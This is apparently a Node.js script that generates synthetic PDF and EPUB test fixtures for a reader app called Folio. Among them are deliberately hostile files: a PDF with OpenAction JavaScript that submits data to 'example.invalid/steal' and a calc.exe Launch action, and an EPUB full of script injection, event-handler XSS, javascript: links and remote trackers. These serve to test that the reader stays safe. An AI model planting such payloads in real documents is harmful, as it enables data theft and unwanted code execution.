// Synthetic PDF fixtures for tests. Deterministic, no copyrighted content.
// Usage: node scripts/generate-fixtures.mjs [outDir]
import { PDFDocument, StandardFonts, rgb, degrees, PDFName, PDFNumber, PDFString } from 'pdf-lib';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { deflateSync } from 'node:zlib';

const out = process.argv[2] ?? 'tests/fixtures/generated';
mkdirSync(out, { recursive: true });
const FIXED_DATE = new Date('2026-01-01T00:00:00Z');

async function newDoc(title) {
  const doc = await PDFDocument.create();
  doc.setTitle(title);
  doc.setAuthor('Folio Test Suite');
  doc.setCreationDate(FIXED_DATE);
  doc.setModificationDate(FIXED_DATE);
  doc.setProducer('folio-fixtures');
  doc.setCreator('folio-fixtures');
  return doc;
}

async function save(doc, name) {
  const bytes = await doc.save({ useObjectStreams: false });
  writeFileSync(join(out, name), bytes);
  return bytes;
}

/** Adds a flat outline (bookmarks) pointing to the given page indexes. */
function addOutline(doc, entries) {
  const ctx = doc.context;
  const pages = doc.getPages();
  const outlinesRef = ctx.nextRef();
  const itemRefs = entries.map(() => ctx.nextRef());
  entries.forEach((e, i) => {
    const dict = ctx.obj({
      Title: PDFString.of(e.title),
      Parent: outlinesRef,
      Dest: [pages[e.page].ref, PDFName.of('Fit')],
    });
    if (i > 0) dict.set(PDFName.of('Prev'), itemRefs[i - 1]);
    if (i < entries.length - 1) dict.set(PDFName.of('Next'), itemRefs[i + 1]);
    ctx.assign(itemRefs[i], dict);
  });
  ctx.assign(
    outlinesRef,
    ctx.obj({ Type: 'Outlines', First: itemRefs[0], Last: itemRefs[itemRefs.length - 1], Count: PDFNumber.of(entries.length) }),
  );
  doc.catalog.set(PDFName.of('Outlines'), outlinesRef);
}

function textPage(doc, font, n, total, size = [595, 842]) {
  const page = doc.addPage(size);
  const [w, h] = size;
  page.drawText(`Folio fixture page ${n}`, { x: 56, y: h - 90, size: 24, font });
  page.drawText(`This is synthetic test text for page ${n} of ${total}.`, { x: 56, y: h - 130, size: 12, font });
  page.drawText('The quick brown fox jumps over the lazy dog. Searchable marker: zephyr' + n, {
    x: 56, y: h - 150, size: 12, font,
  });
  for (let i = 0; i < 20; i++) {
    page.drawText(`Line ${i + 1}: Reading and study workspace sample paragraph text.`, {
      x: 56, y: h - 190 - i * 18, size: 11, font, color: rgb(0.2, 0.2, 0.2),
    });
  }
  page.drawRectangle({ x: 40, y: 40, width: w - 80, height: h - 80, borderColor: rgb(0.6, 0.6, 0.6), borderWidth: 1 });
  page.drawText(String(n), { x: w / 2 - 6, y: 56, size: 10, font });
  return page;
}

// 1. Plain multi-page text with outline and page labels.
{
  const doc = await newDoc('Folio Sample Text');
  const font = await doc.embedFont(StandardFonts.Helvetica);
  for (let i = 1; i <= 12; i++) textPage(doc, font, i, 12);
  addOutline(doc, [
    { title: 'Chapter One', page: 0 },
    { title: 'Chapter Two', page: 4 },
    { title: 'Chapter Three', page: 8 },
  ]);
  // Page labels: i, ii then 1.. (roman front matter)
  const labels = doc.context.obj({
    Nums: [0, doc.context.obj({ S: PDFName.of('r') }), 2, doc.context.obj({ S: PDFName.of('D') })],
  });
  doc.catalog.set(PDFName.of('PageLabels'), labels);
  await save(doc, 'text-12p.pdf');
}

// 2. Rotation, crop box offsets and mixed sizes.
{
  const doc = await newDoc('Folio Geometry Fixture');
  const font = await doc.embedFont(StandardFonts.Helvetica);
  const specs = [
    { size: [595, 842], rot: 0 },
    { size: [612, 792], rot: 90 },
    { size: [842, 595], rot: 180 },
    { size: [595, 842], rot: 270 },
    { size: [500, 700], rot: 0, crop: [60, 80, 400, 520] },
    // Crop box inside a media box with a negative origin. (A crop box that extends past the
    // media box renders differently in PDF.js and Poppler; see docs/DECISIONS.md.)
    { size: [500, 700], rot: 90, crop: [-60, 0, 300, 520], media: [-100, -50, 400, 650] },
  ];
  specs.forEach((s, i) => {
    const page = doc.addPage(s.size);
    if (s.media) page.setMediaBox(...s.media);
    const mb = page.getMediaBox();
    page.drawRectangle({ x: mb.x + 10, y: mb.y + 10, width: mb.width - 20, height: mb.height - 20, borderColor: rgb(0.5, 0.5, 0.5), borderWidth: 2 });
    page.drawText(`Geometry page ${i + 1} rotate ${s.rot}`, { x: mb.x + 70, y: mb.y + mb.height / 2, size: 16, font });
    // Corner marker at canonical (mb.x+20, mb.y+20) for orientation checks
    page.drawRectangle({ x: mb.x + 20, y: mb.y + 20, width: 30, height: 10, color: rgb(0.8, 0.1, 0.1) });
    if (s.crop) page.setCropBox(...s.crop);
    page.setRotation(degrees(s.rot));
  });
  await save(doc, 'geometry.pdf');
}

// 3. "Scanned" page: image only, no text layer.
{
  const doc = await newDoc('Folio Scanned Fixture');
  const w = 200, h = 260;
  const raw = Buffer.alloc((w * 3 + 1) * h);
  for (let y = 0; y < h; y++) {
    raw[y * (w * 3 + 1)] = 0;
    for (let x = 0; x < w; x++) {
      const o = y * (w * 3 + 1) + 1 + x * 3;
      const line = y % 20 < 3 && x > 20 && x < 180;
      const v = line ? 60 : 235 - ((x + y) % 7);
      raw[o] = v; raw[o + 1] = v; raw[o + 2] = v - 5;
    }
  }
  const png = makePng(w, h, raw);
  const img = await doc.embedPng(png);
  for (let i = 0; i < 2; i++) {
    const page = doc.addPage([595, 842]);
    page.drawImage(img, { x: 0, y: 0, width: 595, height: 842 });
  }
  await save(doc, 'scanned.pdf');
}

// 3b. Representative 100-page text PDF for the first-visible-page benchmark.
{
  const doc = await newDoc('Folio Benchmark Text');
  const font = await doc.embedFont(StandardFonts.TimesRoman);
  for (let i = 1; i <= 100; i++) textPage(doc, font, i, 100);
  await save(doc, 'text-100p.pdf');
}

// 4. Large: 500 pages.
{
  const doc = await newDoc('Folio Large Fixture');
  const font = await doc.embedFont(StandardFonts.Helvetica);
  for (let i = 1; i <= 500; i++) {
    const page = doc.addPage([595, 842]);
    page.drawText(`Large fixture page ${i}`, { x: 56, y: 760, size: 28, font });
    page.drawText(`marker-${i}`, { x: 56, y: 720, size: 12, font });
  }
  await save(doc, 'large-500p.pdf');
}

// 5. Malformed / not-a-PDF inputs.
writeFileSync(join(out, 'malformed.pdf'), Buffer.from('%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 9 0 R >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n'));
writeFileSync(join(out, 'not-a-pdf.pdf'), Buffer.from('This is a plain text file pretending to be a PDF.\n'));
writeFileSync(join(out, 'truncated.pdf'), (await PDFDocument.create().then(async (d) => { d.addPage(); return d.save(); }))
  .slice(0, 200));
writeFileSync(join(out, 'empty.pdf'), Buffer.alloc(0));

// 6. Single page for ink/export roundtrips.
{
  const doc = await newDoc('Folio Ink Fixture');
  const font = await doc.embedFont(StandardFonts.Helvetica);
  textPage(doc, font, 1, 1);
  await save(doc, 'single.pdf');
}

// 6b. Hostile-ish: OpenAction JavaScript, a URI link annotation and a launch action.
// Folio must not execute scripts, follow links automatically or crash.
{
  const doc = await newDoc('Folio Hostile Fixture');
  const font = await doc.embedFont(StandardFonts.Helvetica);
  const page = textPage(doc, font, 1, 1);
  const ctx = doc.context;
  const js = ctx.obj({ Type: 'Action', S: 'JavaScript', JS: PDFString.of('app.alert("pwned"); this.submitForm("https://example.invalid/steal");') });
  doc.catalog.set(PDFName.of('OpenAction'), ctx.register(js));
  const link = ctx.obj({
    Type: 'Annot', Subtype: 'Link', Rect: [56, 700, 300, 730], Border: [0, 0, 0],
    A: ctx.obj({ Type: 'Action', S: 'URI', URI: PDFString.of('https://example.invalid/tracker') }),
  });
  const launch = ctx.obj({
    Type: 'Annot', Subtype: 'Link', Rect: [56, 650, 300, 680], Border: [0, 0, 0],
    A: ctx.obj({ Type: 'Action', S: 'Launch', F: PDFString.of('calc.exe') }),
  });
  page.node.set(PDFName.of('Annots'), ctx.obj([ctx.register(link), ctx.register(launch)]));
  await save(doc, 'hostile.pdf');
}

// 7. Unicode (Finnish, Bengali, Arabic RTL, Japanese) via Chromium print, which shapes
// complex scripts. Optional: skipped if Playwright/Chromium is unavailable.
try {
  const { chromium } = await import('playwright');
  const browser = await chromium.launch();
  const page = await browser.newPage();
  await page.setContent(`<!doctype html><meta charset="utf-8"><style>
    body{font-family:'FreeSerif','DejaVu Sans',serif;font-size:20px;margin:48px}
    p{margin:0 0 18px}</style>
    <h1 style="font-family:'DejaVu Sans'">Folio Unicode fixture</h1>
    <p lang="fi">Suomi: Hyvää huomenta, äiti ja isä. Öljyä ja jäätelöä.</p>
    <p lang="bn">বাংলা: আমার সোনার বাংলা, আমি তোমায় ভালোবাসি।</p>
    <p lang="ar" dir="rtl">العربية: مرحبا بالعالم، هذا نص تجريبي.</p>
    <p lang="ja" style="font-family:'IPAGothic'">日本語: 読書と学習のためのアプリ。</p>`);
  writeFileSync(join(out, 'unicode.pdf'), await page.pdf({ format: 'A4', printBackground: true }));
  await browser.close();
} catch (err) {
  console.warn('Skipped unicode.pdf (Playwright Chromium unavailable):', err.message);
}

// ---------------- EPUB fixtures (synthetic) ----------------
{
  const { zipSync, strToU8 } = await import('fflate');
  const solidPng = (w, h, [r, g, b]) => {
    const row = Buffer.alloc(1 + w * 3);
    for (let x = 0; x < w; x++) { row[1 + x * 3] = r; row[2 + x * 3] = g; row[3 + x * 3] = b; }
    return makePng(w, h, Buffer.concat(Array.from({ length: h }, () => row)));
  };
  const xhtml = (title, body, extraHead = '') => `<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" lang="en">
<head><title>${title}</title><link rel="stylesheet" href="../styles/book.css"/>${extraHead}</head>
<body>${body}</body></html>`;
  const para = (n, words = 'Reading and study workspace sample paragraph text for the reflowable fixture.') =>
    Array.from({ length: n }, (_, i) => `<p>Paragraph ${i + 1}. ${words} ${words}</p>`).join('\n');
  const build = (name, { title, author, chapters, extraFiles = {}, spineAttrs = '', lang = 'en', encryption }) => {
    const manifest = chapters.map((c, i) => `<item id="c${i + 1}" href="text/ch${i + 1}.xhtml" media-type="application/xhtml+xml"/>`).join('\n    ');
    const spine = chapters.map((_, i) => `<itemref idref="c${i + 1}"/>`).join('');
    const navList = chapters.map((c, i) => `<li><a href="text/ch${i + 1}.xhtml">${c.title}</a>${c.sub ? `<ol><li><a href="text/ch${i + 1}.xhtml#${c.sub.id}">${c.sub.title}</a></li></ol>` : ''}</li>`).join('');
    const files = {
      mimetype: [strToU8('application/epub+zip'), { level: 0 }],
      'META-INF/container.xml': strToU8(`<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>`),
      'OEBPS/content.opf': strToU8(`<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid" xml:lang="${lang}">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:00000000-0000-4000-8000-${String(name.length).padStart(12, '0')}</dc:identifier>
    <dc:title>${title}</dc:title><dc:creator>${author}</dc:creator><dc:language>${lang}</dc:language>
    <meta property="dcterms:modified">2026-01-01T00:00:00Z</meta>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="css" href="styles/book.css" media-type="text/css"/>
    <item id="cover" href="images/cover.png" media-type="image/png" properties="cover-image"/>
    <item id="fig" href="images/figure.png" media-type="image/png"/>
    ${manifest}
  </manifest>
  <spine${spineAttrs}>${spine}</spine>
</package>`),
      'OEBPS/nav.xhtml': strToU8(xhtml('Contents', `<nav epub:type="toc"><h1>Contents</h1><ol>${navList}</ol></nav>`)),
      'OEBPS/styles/book.css': strToU8('body { background: url(https://example.invalid/bg.png); color: red; } p { margin: 0 }'),
      'OEBPS/images/cover.png': solidPng(120, 180, [40, 70, 120]),
      'OEBPS/images/figure.png': solidPng(200, 80, [200, 120, 40]),
      ...extraFiles,
    };
    chapters.forEach((c, i) => (files[`OEBPS/text/ch${i + 1}.xhtml`] = strToU8(xhtml(c.title, c.body))));
    if (encryption) files['META-INF/encryption.xml'] = strToU8(encryption);
    writeFileSync(join(out, name), zipSync(files, { mtime: FIXED_DATE }));
  };

  build('sample.epub', {
    title: 'Folio Sample EPUB',
    author: 'Folio Test Author',
    chapters: [
      { title: 'Chapter One', body: `<h1>Chapter One</h1><p class="first">The first chapter of the <em>synthetic</em> EPUB fixture. Searchable marker: quasar1</p>${para(8)}<p><a href="ch3.xhtml#later">Jump to the later section</a></p>` },
      {
        title: 'Chapter Two',
        sub: { id: 'figure', title: 'A figure' },
        body: `<h1>Chapter Two</h1>${para(4)}<figure id="figure"><img src="../images/figure.png" alt="Orange test figure"/><figcaption>Figure 1. An orange rectangle.</figcaption></figure><p>See note<a epub:type="noteref" href="#n1">1</a>. External <a href="https://example.com/">example link</a>. Searchable marker: quasar2</p><aside epub:type="footnote" id="n1"><p>1. A footnote.</p></aside>${para(6)}`,
      },
      { title: 'Chapter Three', body: `<h1>Chapter Three</h1>${para(30)}<h2 id="later">Later section</h2><p style="text-align:center;font-style:italic;background:url(https://example.invalid/x.png)">Centered italic line. Searchable marker: quasar3</p>${para(30)}` },
    ],
  });

  build('hostile.epub', {
    title: 'Folio Hostile EPUB',
    author: 'Folio Test Author',
    chapters: [
      {
        title: 'Hostile',
        body: `<h1>Hostile chapter</h1>
<script>window.__folioHacked = 1; alert(1)</script>
<p onclick="window.__folioHacked=2" onmouseover="window.__folioHacked=3">Paragraph with event handlers.</p>
<img src="https://example.invalid/tracker.png" alt="remote image"/>
<img src="x" onerror="window.__folioHacked=4"/>
<iframe src="https://example.invalid/"></iframe>
<object data="https://example.invalid/x.swf"></object>
<form action="https://example.invalid/"><input name="q"/></form>
<p><a href="javascript:window.__folioHacked=5">javascript link</a></p>
<p><a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">data link</a></p>
<svg xmlns="http://www.w3.org/2000/svg"><script>window.__folioHacked=6</script><foreignObject><p>svg text</p></foreignObject></svg>
<p style="background-image:url(https://example.invalid/bg.png);color:red">Styled paragraph.</p>
<link rel="stylesheet" href="https://example.invalid/evil.css"/>
<style>@import url(https://example.invalid/i.css); body{background:url(https://example.invalid/b.png)}</style>
<p>Safe text survives. Searchable marker: hostile1</p>`,
      },
    ],
  });

  build('drm.epub', {
    title: 'Folio DRM EPUB',
    author: 'Folio Test Author',
    chapters: [{ title: 'Locked', body: '<p>Not really encrypted, but declared so.</p>' }],
    encryption: `<?xml version="1.0"?><encryption xmlns="urn:oasis:names:tc:opendocument:xmlns:container" xmlns:enc="http://www.w3.org/2001/04/xmlenc#"><enc:EncryptedData><enc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#aes128-cbc"/><enc:CipherData><enc:CipherReference URI="OEBPS/text/ch1.xhtml"/></enc:CipherData></enc:EncryptedData></encryption>`,
  });

  build('rtl.epub', {
    title: 'Folio RTL EPUB',
    author: 'Folio Test Author',
    lang: 'ar',
    spineAttrs: ' page-progression-direction="rtl"',
    chapters: [
      { title: 'الفصل الأول', body: `<h1 dir="rtl">الفصل الأول</h1><p dir="rtl">مرحبا بالعالم. هذا نص تجريبي.</p>${para(20)}` },
      { title: 'الفصل الثاني', body: `<h1 dir="rtl">الفصل الثاني</h1>${para(20)}` },
    ],
  });
}

console.log('Fixtures written to', out);

function makePng(w, h, rawRows) {
  const crcTable = new Uint32Array(256).map((_, n) => {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    return c >>> 0;
  });
  const crc = (buf) => {
    let c = 0xffffffff;
    for (const b of buf) c = crcTable[(c ^ b) & 0xff] ^ (c >>> 8);
    return (c ^ 0xffffffff) >>> 0;
  };
  const chunk = (type, data) => {
    const len = Buffer.alloc(4); len.writeUInt32BE(data.length);
    const td = Buffer.concat([Buffer.from(type), data]);
    const c = Buffer.alloc(4); c.writeUInt32BE(crc(td));
    return Buffer.concat([len, td, c]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2;
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk('IHDR', ihdr), chunk('IDAT', deflateSync(rawRows)), chunk('IEND', Buffer.alloc(0)),
  ]);
}
